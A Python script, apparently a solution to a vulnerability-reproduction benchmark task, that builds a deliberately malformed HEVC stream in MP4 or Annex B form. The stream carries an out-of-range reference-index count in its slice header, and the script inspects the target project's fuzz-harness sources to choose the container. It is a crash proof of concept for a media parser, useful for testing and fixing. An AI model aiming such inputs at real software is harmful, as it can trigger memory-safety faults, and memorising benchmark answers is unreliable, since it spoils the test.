import os
import io
import tarfile
import struct
from typing import List, Optional


def _u8(x: int) -> bytes:
    return struct.pack(">B", x & 0xFF)


def _u16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def _u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def _box(typ4: bytes, payload: bytes) -> bytes:
    return _u32(8 + len(payload)) + typ4 + payload


class _BitWriter:
    __slots__ = ("_out", "_cur", "_nbits")

    def __init__(self) -> None:
        self._out = bytearray()
        self._cur = 0
        self._nbits = 0  # bits currently in _cur (0..7)

    def write_bit(self, b: int) -> None:
        self._cur = (self._cur << 1) | (1 if b else 0)
        self._nbits += 1
        if self._nbits == 8:
            self._out.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, x: int) -> None:
        if x < 0:
            x = 0
        v = x + 1
        n = v.bit_length()
        if n > 1:
            self.write_bits(0, n - 1)
        self.write_bits(v, n)

    def write_se(self, x: int) -> None:
        if x <= 0:
            ue = (-x) * 2
        else:
            ue = x * 2 - 1
        self.write_ue(ue)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        if self._nbits != 0:
            self._out.append((self._cur << (8 - self._nbits)) & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._out)


def _write_profile_tier_level(bw: _BitWriter, profile_present_flag: int, max_sub_layers_minus1: int) -> None:
    if profile_present_flag:
        bw.write_bits(0, 2)  # general_profile_space
        bw.write_bit(0)      # general_tier_flag
        bw.write_bits(1, 5)  # general_profile_idc
        bw.write_bits(0, 32)  # general_profile_compatibility_flags
        bw.write_bit(0)  # general_progressive_source_flag
        bw.write_bit(0)  # general_interlaced_source_flag
        bw.write_bit(0)  # general_non_packed_constraint_flag
        bw.write_bit(1)  # general_frame_only_constraint_flag
        bw.write_bits(0, 44)  # general_reserved_zero_44bits
        bw.write_bits(120, 8)  # general_level_idc

    for _ in range(max_sub_layers_minus1):
        bw.write_bit(0)  # sub_layer_profile_present_flag
        bw.write_bit(0)  # sub_layer_level_present_flag

    if max_sub_layers_minus1 > 0:
        for _ in range(max_sub_layers_minus1, 8):
            bw.write_bits(0, 2)  # reserved_zero_2bits

    # No sub-layer PTL details since all present flags are 0


def _nal_unit(nal_type: int, rbsp: bytes, temporal_id_plus1: int = 1, layer_id: int = 0) -> bytes:
    # HEVC NAL header: forbidden_zero_bit(1)=0, nal_unit_type(6), nuh_layer_id(6), nuh_temporal_id_plus1(3)
    # bytes: [nal_unit_type<<1 | (layer_id>>5)], [((layer_id&31)<<3) | temporal_id_plus1]
    b0 = ((nal_type & 0x3F) << 1) | ((layer_id >> 5) & 0x01)
    b1 = ((layer_id & 0x1F) << 3) | (temporal_id_plus1 & 0x07)
    return bytes((b0, b1)) + rbsp


def _make_vps() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bit(1)      # vps_base_layer_internal_flag
    bw.write_bit(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    _write_profile_tier_level(bw, 1, 0)
    bw.write_bit(0)  # vps_sub_layer_ordering_info_present_flag
    bw.write_ue(1)   # vps_max_dec_pic_buffering_minus1
    bw.write_ue(0)   # vps_max_num_reorder_pics
    bw.write_ue(0)   # vps_max_latency_increase_plus1
    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)       # vps_num_layer_sets_minus1
    bw.write_bit(0)      # vps_timing_info_present_flag
    bw.write_bit(0)      # vps_extension_flag
    bw.rbsp_trailing_bits()
    rbsp = bw.get_bytes()
    return _nal_unit(32, rbsp)


def _make_sps() -> bytes:
    bw = _BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag
    _write_profile_tier_level(bw, 1, 0)
    bw.write_ue(0)  # sps_seq_parameter_set_id
    bw.write_ue(1)  # chroma_format_idc (4:2:0)
    bw.write_ue(16)  # pic_width_in_luma_samples
    bw.write_ue(16)  # pic_height_in_luma_samples
    bw.write_bit(0)  # conformance_window_flag
    bw.write_ue(0)  # bit_depth_luma_minus8
    bw.write_ue(0)  # bit_depth_chroma_minus8
    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
    bw.write_bit(0)  # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(1)  # sps_max_dec_pic_buffering_minus1
    bw.write_ue(0)  # sps_max_num_reorder_pics
    bw.write_ue(0)  # sps_max_latency_increase_plus1

    bw.write_ue(0)  # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)  # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)  # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)  # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)  # max_transform_hierarchy_depth_inter
    bw.write_ue(0)  # max_transform_hierarchy_depth_intra

    bw.write_bit(0)  # scaling_list_enabled_flag
    bw.write_bit(0)  # amp_enabled_flag
    bw.write_bit(0)  # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)  # pcm_enabled_flag

    bw.write_ue(1)  # num_short_term_ref_pic_sets
    # st_ref_pic_set(0)
    bw.write_bit(0)  # inter_ref_pic_set_prediction_flag
    bw.write_ue(1)  # num_negative_pics
    bw.write_ue(0)  # num_positive_pics
    bw.write_ue(0)  # delta_poc_s0_minus1[0] => -1
    bw.write_bit(1)  # used_by_curr_pic_s0_flag[0]

    bw.write_bit(0)  # long_term_ref_pics_present_flag
    bw.write_bit(0)  # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)  # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.write_bit(0)  # sps_extension_present_flag
    bw.rbsp_trailing_bits()
    rbsp = bw.get_bytes()
    return _nal_unit(33, rbsp)


def _make_pps() -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # pps_pic_parameter_set_id
    bw.write_ue(0)  # sps_seq_parameter_set_id
    bw.write_bit(0)  # dependent_slice_segments_enabled_flag
    bw.write_bit(0)  # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)  # sign_data_hiding_enabled_flag
    bw.write_bit(0)  # cabac_init_present_flag
    bw.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)  # init_qp_minus26
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # transform_skip_enabled_flag
    bw.write_bit(0)  # cu_qp_delta_enabled_flag
    bw.write_se(0)  # pps_cb_qp_offset
    bw.write_se(0)  # pps_cr_qp_offset
    bw.write_bit(0)  # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bit(0)  # weighted_bipred_flag
    bw.write_bit(0)  # transquant_bypass_enabled_flag
    bw.write_bit(0)  # tiles_enabled_flag
    bw.write_bit(0)  # entropy_coding_sync_enabled_flag
    bw.write_bit(0)  # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # pps_scaling_list_data_present_flag
    bw.write_bit(0)  # lists_modification_present_flag
    bw.write_ue(0)  # log2_parallel_merge_level_minus2
    bw.write_bit(0)  # slice_segment_header_extension_present_flag
    bw.write_bit(0)  # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    rbsp = bw.get_bytes()
    return _nal_unit(34, rbsp)


def _make_slice(num_ref_idx_l0_active_minus1: int) -> bytes:
    bw = _BitWriter()
    bw.write_bit(1)  # first_slice_segment_in_pic_flag
    bw.write_ue(0)   # slice_pic_parameter_set_id
    bw.write_ue(1)   # slice_type: 1=P
    bw.write_bits(0, 4)  # slice_pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb=4)
    bw.write_bit(1)  # short_term_ref_pic_set_sps_flag
    bw.write_bit(1)  # num_ref_idx_active_override_flag
    bw.write_ue(num_ref_idx_l0_active_minus1)
    bw.write_ue(0)  # five_minus_max_num_merge_cand
    bw.write_se(0)  # slice_qp_delta
    bw.rbsp_trailing_bits()
    rbsp = bw.get_bytes()
    return _nal_unit(1, rbsp)


def _make_hvcc(vps: bytes, sps: bytes, pps: bytes) -> bytes:
    # HEVCDecoderConfigurationRecord (hvcC)
    payload = bytearray()
    payload += _u8(1)  # configurationVersion
    payload += _u8(0x01)  # general_profile_space/tier/profile_idc => Main profile
    payload += _u32(0)  # general_profile_compatibility_flags
    payload += b"\x00" * 6  # general_constraint_indicator_flags
    payload += _u8(120)  # general_level_idc
    payload += _u16(0xF000)  # reserved(4)=1111 + min_spatial_segmentation_idc(12)=0
    payload += _u8(0xFC | 0)  # reserved(6)=111111 + parallelismType(2)=0
    payload += _u8(0xFC | 1)  # reserved(6)=111111 + chromaFormat(2)=1 (4:2:0)
    payload += _u8(0xF8 | 0)  # reserved(5)=11111 + bitDepthLumaMinus8(3)=0
    payload += _u8(0xF8 | 0)  # reserved(5)=11111 + bitDepthChromaMinus8(3)=0
    payload += _u16(0)  # avgFrameRate
    payload += _u8((0 << 6) | (1 << 3) | (1 << 2) | 3)  # constantFrameRate=0, numTemporalLayers=1, temporalIdNested=1, lengthSizeMinusOne=3 (4 bytes)
    payload += _u8(3)  # numOfArrays

    def add_array(nal_type: int, nal: bytes) -> None:
        payload.append(0x80 | (nal_type & 0x3F))  # array_completeness=1
        payload.extend(_u16(1))  # numNalus
        payload.extend(_u16(len(nal)))
        payload.extend(nal)

    add_array(32, vps)
    add_array(33, sps)
    add_array(34, pps)

    return _box(b"hvcC", bytes(payload))


def _make_visual_sample_entry_hvc1(width: int, height: int, hvcc_box: bytes) -> bytes:
    # VisualSampleEntry fields
    payload = bytearray()
    payload += b"\x00" * 6  # reserved
    payload += _u16(1)  # data_reference_index
    payload += _u16(0)  # pre_defined
    payload += _u16(0)  # reserved
    payload += _u32(0) * 3  # pre_defined[3]
    payload += _u16(width)
    payload += _u16(height)
    payload += _u32(0x00480000)  # horizresolution 72 dpi
    payload += _u32(0x00480000)  # vertresolution
    payload += _u32(0)  # reserved
    payload += _u16(1)  # frame_count
    payload += b"\x00" * 32  # compressorname
    payload += _u16(0x0018)  # depth
    payload += _u16(0xFFFF)  # pre_defined
    payload += hvcc_box
    return _box(b"hvc1", bytes(payload))


def _make_mp4(nals_in_sample: List[bytes]) -> bytes:
    # ftyp
    ftyp = _box(b"ftyp", b"isom" + _u32(0x200) + b"isom" + b"iso6" + b"mp41")

    # Build sample data (length-prefixed NAL units, 4-byte lengths)
    sample = bytearray()
    for n in nals_in_sample:
        sample += _u32(len(n))
        sample += n
    sample_bytes = bytes(sample)

    # Build hvcC from parameter sets (use the ones present in sample too)
    vps = next((n for n in nals_in_sample if len(n) >= 2 and (n[0] >> 1) == 32), None)
    sps = next((n for n in nals_in_sample if len(n) >= 2 and (n[0] >> 1) == 33), None)
    pps = next((n for n in nals_in_sample if len(n) >= 2 and (n[0] >> 1) == 34), None)
    if vps is None:
        vps = _make_vps()
    if sps is None:
        sps = _make_sps()
    if pps is None:
        pps = _make_pps()
    hvcc = _make_hvcc(vps, sps, pps)

    # stsd
    sample_entry = _make_visual_sample_entry_hvc1(16, 16, hvcc)
    stsd = _box(b"stsd", b"\x00\x00\x00\x00" + _u32(1) + sample_entry)

    # stts, stsc, stsz, stco (placeholder)
    stts = _box(b"stts", b"\x00\x00\x00\x00" + _u32(1) + _u32(1) + _u32(1000))
    stsc = _box(b"stsc", b"\x00\x00\x00\x00" + _u32(1) + _u32(1) + _u32(1) + _u32(1))
    stsz = _box(b"stsz", b"\x00\x00\x00\x00" + _u32(0) + _u32(1) + _u32(len(sample_bytes)))
    stco_placeholder = _box(b"stco", b"\x00\x00\x00\x00" + _u32(1) + _u32(0))

    stbl = _box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)

    # dinf/dref/url
    url = _box(b"url ", b"\x00\x00\x00\x01")
    dref = _box(b"dref", b"\x00\x00\x00\x00" + _u32(1) + url)
    dinf = _box(b"dinf", dref)

    vmhd = _box(b"vmhd", b"\x00\x00\x00\x01" + _u16(0) + _u16(0) + _u16(0) + _u16(0))
    minf = _box(b"minf", vmhd + dinf + stbl)

    mdhd = _box(b"mdhd", b"\x00\x00\x00\x00" + _u32(0) + _u32(0) + _u32(1000) + _u32(1000) + _u16(0) + _u16(0))
    hdlr = _box(b"hdlr", b"\x00\x00\x00\x00" + _u32(0) + b"vide" + b"\x00" * 12 + b"VideoHandler\x00")
    mdia = _box(b"mdia", mdhd + hdlr + minf)

    matrix = struct.pack(">9I", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    tkhd = _box(
        b"tkhd",
        b"\x00\x00\x00\x07" + _u32(0) + _u32(0) + _u32(1) + _u32(0) + _u32(1000) +
        b"\x00" * 8 + _u16(0) + _u16(0) + _u16(0) + _u16(0) + matrix + _u32(16 << 16) + _u32(16 << 16)
    )
    trak = _box(b"trak", tkhd + mdia)

    mvhd = _box(
        b"mvhd",
        b"\x00\x00\x00\x00" + _u32(0) + _u32(0) + _u32(1000) + _u32(1000) +
        _u32(0x00010000) + _u16(0x0100) + _u16(0) + b"\x00" * 8 + matrix +
        b"\x00" * 24 + _u32(2)
    )
    moov_placeholder = _box(b"moov", mvhd + trak)

    # Patch stco offset
    mdat_header_size = 8
    offset = len(ftyp) + len(moov_placeholder) + mdat_header_size
    stco = _box(b"stco", b"\x00\x00\x00\x00" + _u32(1) + _u32(offset))

    # Rebuild with real stco
    stbl2 = _box(b"stbl", stsd + stts + stsc + stsz + stco)
    minf2 = _box(b"minf", vmhd + dinf + stbl2)
    mdia2 = _box(b"mdia", mdhd + hdlr + minf2)
    trak2 = _box(b"trak", tkhd + mdia2)
    moov = _box(b"moov", mvhd + trak2)

    # mdat
    mdat = _box(b"mdat", sample_bytes)

    return ftyp + moov + mdat


def _make_annexb(nals: List[bytes]) -> bytes:
    out = bytearray()
    for n in nals:
        out += b"\x00\x00\x00\x01"
        out += n
    return bytes(out)


def _iter_text_sources_from_tar(src_path: str, max_file_size: int = 2_000_000):
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_file_size:
                    continue
                name = m.name.lower()
                if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp")):
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                yield m.name, data
    except Exception:
        return


def _iter_text_sources_from_dir(src_dir: str, max_file_size: int = 2_000_000):
    for root, _, files in os.walk(src_dir):
        for fn in files:
            lfn = fn.lower()
            if not (lfn.endswith(".c") or lfn.endswith(".cc") or lfn.endswith(".cpp") or lfn.endswith(".h") or lfn.endswith(".hpp")):
                continue
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > max_file_size:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
                yield path, data
            except Exception:
                continue


def _detect_container_preference(src_path: str) -> str:
    # Returns "mp4" or "annexb"
    prefer_mp4 = False
    prefer_annexb = False

    def consider(name: str, data: bytes) -> None:
        nonlocal prefer_mp4, prefer_annexb
        low = data.lower()
        if b"llvmfuzzertestoneinput" not in low:
            return

        if b"gf_isom_open" in low or b"gf_isom" in low:
            prefer_mp4 = True

        if b".mp4" in low or b"mp4box" in low or b"isom" in low:
            prefer_mp4 = True

        if b".hevc" in low or b".265" in low or b"annexb" in low:
            prefer_annexb = True

        # Some harnesses create temp file with extension
        if b"tmp.mp4" in low or b"input.mp4" in low:
            prefer_mp4 = True
        if b"tmp.hevc" in low or b"input.hevc" in low or b"input.265" in low:
            prefer_annexb = True

    if os.path.isdir(src_path):
        for name, data in _iter_text_sources_from_dir(src_path):
            consider(name, data)
            if prefer_mp4:
                break
    else:
        for name, data in _iter_text_sources_from_tar(src_path):
            consider(name, data)
            if prefer_mp4:
                break

    if prefer_mp4:
        return "mp4"
    if prefer_annexb:
        return "annexb"
    return "mp4"


class Solution:
    def solve(self, src_path: str) -> bytes:
        vps = _make_vps()
        sps = _make_sps()
        pps = _make_pps()
        slc = _make_slice(100)

        container = _detect_container_preference(src_path)
        if container == "annexb":
            return _make_annexb([vps, sps, pps, slc])

        # For robustness, include parameter sets in-sample as well.
        return _make_mp4([vps, sps, pps, slc])